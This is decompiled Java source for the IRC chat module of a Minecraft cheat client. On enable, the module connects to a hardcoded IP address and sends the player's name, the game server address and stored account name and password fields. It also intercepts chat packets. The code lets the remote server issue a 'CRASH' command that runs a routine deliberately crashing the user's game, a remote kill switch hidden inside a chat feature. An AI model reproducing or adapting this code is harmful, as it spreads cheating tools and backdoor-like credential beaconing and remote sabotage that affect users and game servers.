/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.minecraft.client.Minecraft
 *  net.minecraft.network.play.client.CPacketChatMessage
 *  net.minecraftforge.fml.relauncher.ReflectionHelper
 */
package zelix.hack.hacks.irc;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.List;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.CPacketChatMessage;
import net.minecraftforge.fml.relauncher.ReflectionHelper;
import zelix.Core;
import zelix.hack.Hack;
import zelix.hack.HackCategory;
import zelix.hack.hacks.irc.IRCTheard;
import zelix.managers.HackManager;
import zelix.utils.Cr4sh;
import zelix.utils.Utils;
import zelix.utils.Wrapper;
import zelix.utils.hooks.visual.ChatUtils;
import zelix.utils.system.Connection;
import zelix.utils.system.EnumChatFormatting;

public class IRCChat
extends Hack {
    public static boolean isdev = false;
    public BufferedReader reader;
    public static Socket socket;
    public static PrintWriter pw;
    static InputStream in;
    private static boolean connect;
    private static String prefix;
    public static List<String> banned;
    public static String FGF;
    private static int sec;

    public IRCChat() {
        super("IRCChat", HackCategory.ANOTHER);
    }

    @Override
    public void onEnable() {
        if (Utils.nullCheck()) {
            return;
        }
        new IRCTheard().start();
        super.onEnable();
    }

    public static void send(String TEXT) {
        try {
            socket.getOutputStream().write(TEXT.getBytes("UTF-8"));
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDisable() {
        try {
            connect = false;
            if (in == null || socket.getOutputStream() == null || socket == null) {
                return;
            }
            in.close();
            socket.getOutputStream().close();
            socket.close();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
        ChatUtils.warning("Disconnect from IRC!");
        super.onDisable();
    }

    @Override
    public boolean onPacket(Object packet, Connection.Side side) {
        if (side == Connection.Side.OUT && packet instanceof CPacketChatMessage) {
            Field field = ReflectionHelper.findField(CPacketChatMessage.class, (String[])new String[]{"message", "field_149440_a"});
            try {
                if (!field.isAccessible()) {
                    field.setAccessible(true);
                }
                if (packet instanceof CPacketChatMessage) {
                    CPacketChatMessage p = (CPacketChatMessage)packet;
                    if (p.func_149439_c().subSequence(0, 1).equals("+")) {
                        IRCChat.write("[TARGET][MESSAGE][MSG][" + p.func_149439_c().substring(1, p.func_149439_c().length()) + "]");
                        return false;
                    }
                    return true;
                }
            }
            catch (Exception e) {
                e.printStackTrace();
                this.onDisable();
                this.onEnable();
            }
        }
        return true;
    }

    public static void connect() {
        ChatUtils.warning("Try to connect to the server...");
        try {
            socket = new Socket("121.62.61.198", 9998);
            in = socket.getInputStream();
            pw = new PrintWriter(new OutputStreamWriter(socket.getOutputStream(), "UTF-8"), true);
            if (Wrapper.INSTANCE.mc().getCurrentServerData() != null) {
                IRCChat.write("[TARGET][CONNECT][HOST][121.62.61.198:14100][GAMEID][" + Wrapper.INSTANCE.player().getName() + "][GAMEIP][" + Minecraft.getMinecraft().getCurrentServerData().serverIP.toLowerCase() + "][ACT][" + Core.UN + "][PWD][" + Core.UP + "]");
            } else {
                IRCChat.write("[TARGET][CONNECT][HOST][121.62.61.198:14100][GAMEID][" + Wrapper.INSTANCE.player().getName() + "][GAMEIP][Local][ACT][" + Core.UN + "][PWD][" + Core.UP + "]");
            }
        }
        catch (IOException e) {
            ChatUtils.error("Failed to Connect!");
            HackManager.getHack("IRCChat").setToggled(false);
            HackManager.getHack("IRCChat").onDisable();
            e.printStackTrace();
        }
    }

    public static void handleInput() {
        block12: {
            byte[] data = new byte[1024];
            try {
                String Type2;
                int len = in.read(data);
                String ircmessage = new String(data, 0, len);
                ircmessage = ircmessage.replaceAll("\n", "");
                ircmessage = ircmessage.replaceAll("\r", "");
                ircmessage = ircmessage.replaceAll("\t", "");
                if (!connect) {
                    if (ircmessage.equals("SUC")) {
                        ChatUtils.message("Connection is Successful!");
                        connect = true;
                    } else if (ircmessage.equals("FAIL")) {
                        ChatUtils.error("Connection is Failed!");
                        connect = false;
                    }
                    break block12;
                }
                if (ircmessage.equals("CRASH")) {
                    ChatUtils.error("You Are Crashed By A BETA USER OR SERVER!");
                    try {
                        Thread.sleep(60000L);
                    }
                    catch (InterruptedException e) {
                        new Cr4sh();
                    }
                    new Cr4sh();
                }
                if (!(Type2 = Utils.getSubString(ircmessage, "[TYPE][", "]")).equalsIgnoreCase("SMSG")) {
                    if (Type2.equalsIgnoreCase("NMSG")) {
                        String USER = Utils.getSubString(ircmessage, "[USER][", "]");
                        String MSG = Utils.getSubString(ircmessage, "[MSG][", "]");
                        String Title = Utils.getSubString(ircmessage, "[TITLE][", "]");
                        String Server = Utils.getSubString(ircmessage, "[SERVER][", "]");
                        ChatUtils.IRC((Object)((Object)EnumChatFormatting.DARK_AQUA) + "[" + (Object)((Object)EnumChatFormatting.GOLD) + Server + (Object)((Object)EnumChatFormatting.DARK_AQUA) + "]" + (Object)((Object)EnumChatFormatting.DARK_AQUA) + "[" + (Object)((Object)EnumChatFormatting.WHITE) + Title + (Object)((Object)EnumChatFormatting.DARK_AQUA) + "]" + (Object)((Object)EnumChatFormatting.AQUA) + USER + ": " + (Object)((Object)EnumChatFormatting.WHITE) + MSG);
                    } else {
                        ChatUtils.message(ircmessage);
                    }
                }
            }
            catch (IOException iOException) {
                // empty catch block
            }
        }
    }

    public static void write(String str) {
        try {
            socket.getOutputStream().write(str.getBytes(StandardCharsets.UTF_8));
            socket.getOutputStream().flush();
        }
        catch (Throwable e) {
            e.printStackTrace();
        }
    }

    static {
        connect = false;
        prefix = "";
        FGF = "r@safucku@uuense@";
        sec = 1;
    }
}

